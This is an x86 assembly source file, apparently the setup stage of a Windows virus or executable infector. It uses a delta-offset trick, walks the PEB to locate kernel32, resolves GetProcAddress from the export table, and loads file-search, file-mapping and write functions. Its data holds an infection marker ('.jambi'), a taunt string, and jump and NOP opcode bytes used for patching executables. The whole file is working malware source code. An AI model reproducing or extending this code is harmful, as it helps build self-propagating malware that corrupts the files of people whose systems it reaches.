include		funcs.asm

.code

peb:

jmp @@my_vars
peb_continue:
	;---------------------------------------------------------------------------------
	; EBP
	;---------------------------------------------------------------------------------
	; HANDLE				200	Kernel32.dll
	; HANDLE				204	Kernel32 exportTable
	; HANDLE 				208	LoadLibraryA
	; HANDLE				212	GetProcAddr
	;---------------------------------------------------------------------------------
        ; DLLS
	;---------------------------------------------------------------------------------
	; HANDLE				216	User32
	; HANDLE				220	msvcrt.dll
	; HANDLE				224	Shlwapi.dll
	;---------------------------------------------------------------------------------
	; Kernel32 Functions
	;---------------------------------------------------------------------------------
	; HANDLE				228	CreateFileA
	; HANDLE				232	CreateFileMappingA
	; HANDLE				236	ExitProcess
	; HANDLE				240	FindFirstFileA
	; HANDLE				244	GetCurrentDirectoryA
	; HANDLE				248	strcat (from msvcrt.dll)
	; HANDLE				252	MapViewOfFile
	; HANDLE				256	SetFilePointer
	; HANDLE				260	UnmapViewOfFile
	; HANDLE				264	WriteFile
	;---------------------------------------------------------------------------------
	; User32 Functions
	;---------------------------------------------------------------------------------
	; HANDLE				268	MessageBoxA
	;---------------------------------------------------------------------------------
	; msvcrt Functions
	;---------------------------------------------------------------------------------
	; HANDLE				272	memcmp
	; HANDLE				276	memcpy
	; HANDLE				280	printf
	; HANDLE				284	strcpy
	; HANDLE				288	strncmp
	;---------------------------------------------------------------------------------
	; Shlwapi.dll Functions
	;---------------------------------------------------------------------------------
	; HANDLE				292	StrDupA
	;---------------------------------------------------------------------------------
	; salade de fruits
	;---------------------------------------------------------------------------------
	; HANDLE				296	CloseHandle
	; HANDLE				300	FindNextFile			
	; HANDLE				304	strlen				msvcrt
	; HANDLE				308	malloc				msvcrt
	; HANDLE				312	GetSystemTime			kernel32
	;---------------------------------------------------------------------------------
	; VARIABLES
	;---------------------------------------------------------------------------------
	; 					400     GetProcAddress
	; 					404	LoadLibraryExA
	; 					408	CreateFileA
	; 					412	CreateFileMappingA
	; 					416	ExitProcess
	; 					420	FindFirstFileA
	; 					424	GetCurrentDirectoryA
	; 					428	lstrcatA
	; 					432	MapViewOfFile
	; 					436	SetFilePointer
	; 					440	UnmapViewOfFile
	; 					444	WriteFile
	; 					448	User32
	; 					452	MessageBoxA
	; 					456	msvcrt
	; 					460	memcmp
	; 					464	memcpy
	; 					468	printf
	; 					472	strcpy
	; 					476	strncmp
	; 					480	Shlwapi
	; 					484	StrDupA
	; 					488	CloseHandle
	; 					492	FindNextFileA
	; 					496	"\*"
	; 					500	"~[popup title]~"
	; 					504	".jambi"
	; 					508	"addr: %p size: %d", 13, 10
	; 					512	"random [error/txt/affichage]", 13, 10
	; 					516	8
	; 					524	... %p
	; 					528	233, 144
	; 					532	'loli own da world', 0
	; 					536	'lstrlenA', 0
	; 					540	'malloc', 0
	; 					544	'm', 0
	;					548	'GetSystemTime',0
	;---------------------------------------------------------------------------------

pop	edx
mov	[ebp - 400], edx

mov	eax, [ebp - 400]

;; GetProcAddress
add	eax, 6
mov	[ebp - 400], eax

;; LoadLibraryExA
add	eax, 15
mov	[ebp - 404], eax

;; CreateFileA
add	eax, 15
mov	[ebp - 408], eax

;; CreateFileMappingA
add	eax, 12
mov	[ebp - 412], eax

;; ExitProcess
add	eax, 19
mov	[ebp - 416], eax

;; FindFirstFileA
add	eax, 12
mov	[ebp - 420], eax

;; GetCurrentDirectoryA
add	eax, 15
mov	[ebp - 424], eax

;; lstrcatA
add	eax, 21
mov	[ebp - 428], eax

;; MapViewOfFile
add	eax, 9
mov	[ebp - 432], eax

;; SetFilePointer
add	eax, 14
mov	[ebp - 436], eax

;; UnmapViewOfFile
add	eax, 15
mov	[ebp - 440], eax

;; WriteFile
add	eax, 16
mov	[ebp - 444], eax

;; User32
add	eax, 10
mov	[ebp - 448], eax

;; MessageBoxA
add	eax, 7
mov	[ebp - 452], eax

;; msvcrt
add	eax, 12
mov	[ebp - 456], eax

;; memcmp
add	eax, 7
mov	[ebp - 460], eax

;; memcpy
add	eax, 7
mov	[ebp - 464], eax

;; printf
add	eax, 7
mov	[ebp - 468], eax

;; strcpy
add	eax, 7
mov	[ebp - 472], eax

;; strncmp
add	eax, 7
mov	[ebp - 476], eax

;; Shlwapi
add	eax, 8
mov	[ebp - 480], eax

;; StrDupA
add	eax, 8
mov	[ebp - 484], eax

;; CloseHandle
add	eax, 8
mov	[ebp - 488], eax

;; FindNextFileA
add	eax, 12
mov	[ebp - 492], eax

;; "\*"
add	eax, 14
mov	[ebp - 496], eax

;; "~[popup title]~"
add	eax, 3
mov	[ebp - 500], eax

;; ".jambi"
add	eax, 16
mov	[ebp - 504], eax

;; "addr: %p size: %d", 13, 10
add	eax, 7
mov	[ebp - 508], eax

;; "random [error/txt/affichage]", 13, 10
add	eax, 20
mov	[ebp - 512], eax

;; 8
add	eax, 31
mov	[ebp - 516], eax

;; byte 144
add	eax, 4
mov	[ebp - 520], eax

;; db 'beg_sh %p', 13, 10, 0
add	eax, 1
mov	[ebp - 524], eax

;; 233, 144
add	eax, 12
mov	[ebp - 528], eax

;; 'loli own da world', 0
add	eax, 2
mov	[ebp - 532], eax

;; 'lstrlenA', 0
add	eax, 18
mov	[ebp - 536], eax

;; 'malloc', 0
add	eax, 9
mov	[ebp - 540], eax

;; 'm', 0
add	eax, 7
mov	[ebp - 544], eax

; 'GetSystemTime',0
add	eax, 2
mov	[ebp - 548], eax

;; -------
	;;
	;;
	;;
	;;
	;;
	;;
	;;
	;;
	;;
	;;
;; -------

call	GetKernel32Address
mov	[ebp - 200], eax					; saving &kernel32

push	[ebp - 200]
call	GetExportTableAddress
mov	[ebp - 204], eax					; saving &exportTable

;GetFuncAddr(&kernel32, &exportTable, "GetProcAddress")
push	[ebp - 400]		; GetProcAdress
push	[ebp - 204]
push	[ebp - 200]
call	GetFuncAddr
mov    [ebp - 212], eax						;saving GetProcAddr

;GetProcAddress(&kernel32, "ExitProcess")
push	[ebp - 416]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 236], eax

or	eax, eax
jz	_exit_without_exitprocess


;invoke	crt_printf, offset pattern2, eax
;GetFundAddr(&kernel32, &exportTable, "LoadLibraryExA")

push	[ebp - 404]
push	[ebp - 204]
push	[ebp - 200]
call	GetFuncAddr
mov	[ebp - 208], eax

; invoke	crt_printf, offset pattern3, eax

;LoadLibraryExA("User32", 0, 0);
push	0
push	0
push	[ebp - 448]
mov	eax, [ebp - 208]
call	eax
mov	[ebp - 216], eax					;saving user32.dll

or	eax, eax
jz	_error_init

; invoke	crt_printf, offset patternuser32, eax

;GetProcAddress(&User32, "MessageBoxA")
push	[ebp - 452]
push	[ebp - 216]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 268], eax					;saving MessageBoxA

or	eax, eax
jz	_error_init

;GetProcAddress(&kernel32, "CreateFileA")
push	[ebp - 408]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 228], eax

or	eax, eax
jz	_error_init

;GetProcAddress(&kernel32, "CreateFileMappingA")
push	[ebp - 412]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 232], eax

or	eax, eax
jz	_error_init

;[ebp-240] =GetProcAddress(&kernel32, "FindFirstFileA")
push	[ebp - 420]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 240],eax

or	eax, eax
jz	_error_init

;[ebp-244] = GetProcAddress(&kernel32, "GetCurrentDirectoryA")
push	[ebp - 424]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 244], eax

or	eax, eax
jz	_error_init

; GetProcAddress(&kernel32, "MapViewOfFile")
push	[ebp - 432]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 252], eax

or	eax, eax
jz	_error_init

; GetProcAddress(&kernel32, "SetFilePointer")
push	[ebp - 436]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 256], eax

or	eax, eax
jz	_error_init

; GetProcAddress(&User32, "UnmapViewOfFile")
push	[ebp - 440]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 260], eax

or	eax, eax
jz	_error_init

; GetProcAddress(&User32, "WriteFile")
push	[ebp - 444]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 264], eax

or	eax, eax
jz	_error_init


;LoadLibraryExA("msvcrt", 0, 0);
push	0
push	0
push	[ebp - 456]
mov	eax, [ebp - 208]
call	eax
mov	[ebp - 220], eax	;saving msvcrt.dll

or	eax, eax
jz	_error_init

; GetProcAddress(&msvcrt, memcmp)
push	[ebp - 460]
push	[ebp - 220]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 272], eax

or	eax, eax
jz	_error_init

; GetProcAddress(&msvcrt,memcpy)
push	[ebp - 464]
push	[ebp - 220]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 276], eax

or	eax, eax
jz	_error_init

; GetProcAddress(&msvcrt, printf)
push	[ebp - 468]
push	[ebp - 220]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 280], eax

or	eax, eax
jz	_error_init

; GetProcAddress(&??, "strcat")
push	[ebp - 428]
push	[ebp - 200]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 248], eax

or	eax, eax
jz	_error_init

; GetProcAddress(&msvcrt, strcpy)
push	[ebp - 472]
push	[ebp - 220]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 284], eax

or	eax, eax
jz	_error_init

; GetProcAddress(&msvcrt, strncmp)
push	[ebp - 476]
push	[ebp - 220]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 288], eax

or	eax, eax
jz	_error_init

;LoadLibraryExA("Shlwapi", 0, 0);
push	0
push	0
push	[ebp - 480]
mov	eax, [ebp - 208]
call	eax
mov	[ebp - 224], eax					;saving Shlwapi.dll

or eax, eax
jz _error_init

; GetProcAddress(&msvcrt,StrDupA)
push	[ebp - 484]
push	[ebp - 224]
mov	eax, [ebp - 212]
call	eax
mov	[ebp - 292], eax

or	eax, eax
jz	_error_init

; CloseHandle
push 	[ebp - 488]
push	[ebp - 200]	 					;kernel32
call	dword ptr [ebp - 212]					;GetProcAdress
mov	[ebp - 296], eax

or	eax, eax
jz	_error_init

; FindNextFile
push 	[ebp - 492]
push	[ebp - 200]	 					;kernel32
call	dword ptr [ebp - 212]					;GetProcAdress
mov	[ebp - 300], eax

or	eax, eax
jz	_error_init

; strlen
push 	[ebp - 536]
push	[ebp - 200]	 					;should be msvcrt but works zith kernel32
call	dword ptr [ebp - 212]					;GetProcAdress
mov	[ebp - 304], eax

or	eax, eax
jz	_error_init

; malloc
push 	[ebp - 540]
push	[ebp - 220]	 					;msvcrt
call	dword ptr [ebp - 212]					;GetProcAdress
mov	[ebp - 308], eax

or	eax, eax
jz	_error_init


;GetSystemTime
push	[ebp - 548]
push	[ebp - 200]						;kernel32
call	dword ptr [ebp - 212]					;GetProcAddress
mov	[ebp - 312], eax

or	eax, eax
jz	_error_init

ret

@@my_vars:
	call peb_continue
	db	"error", 0
	db	"GetProcAddress", 0	; 0
	db	"LoadLibraryExA", 0	; 15
	db	"CreateFileA", 0	; 30
	db	"CreateFileMappingA", 0 ; 42
	db	"ExitProcess", 0	; 61
	db	"FindFirstFileA", 0	; 73
	db	"GetCurrentDirectoryA", 0 ; 88
	db	"lstrcatA", 0 		; 109
	db	"MapViewOfFile", 0 	; 118
	db	"SetFilePointer", 0 	; 134
	db	"UnmapViewOfFile", 0 	; 149
	db	"WriteFile", 0 		; 165
	db	"User32", 0 		; 175
	db	"MessageBoxA", 0 	; 182
	db	"msvcrt", 0 		; 194
	db	"memcmp", 0 		; 201
	db	"memcpy", 0 		; 208
	db	"printf", 0 		; 215
	db	"strcpy", 0		; 222
	db	"strncmp", 0 		; 229
	db	"Shlwapi", 0 		; 237
	db	"StrDupA", 0 		; 245
	db	"CloseHandle", 0 	; 253
	db	"FindNextFileA", 0 	; 265
	db	"\*", 0			; + 14
	db	"~[popup title]~", 0	; + 3
	db	".jambi", 0		; + 16
	db	"addr: %p size: %d", 13, 10, 0 ; + 7
	db 	"random [error/txt/affichage]", 13, 10, 0 	; + 20
	dword	8					; + 31
	byte	144
	db 	"beg_   %d", 13, 10, 0
	db	144, 233d
	db	"loli own da world", 0
	db	"lstrlenA", 0
	db	"malloc", 0
	db	"m", 0
	db	"GetSystemTime", 0

_error_init:
	push	[ebp - 512]
	call	dword  ptr[ebp - 280]
	push	0
	call	dword ptr [ebp - 236] 			; ExitProcess, 0
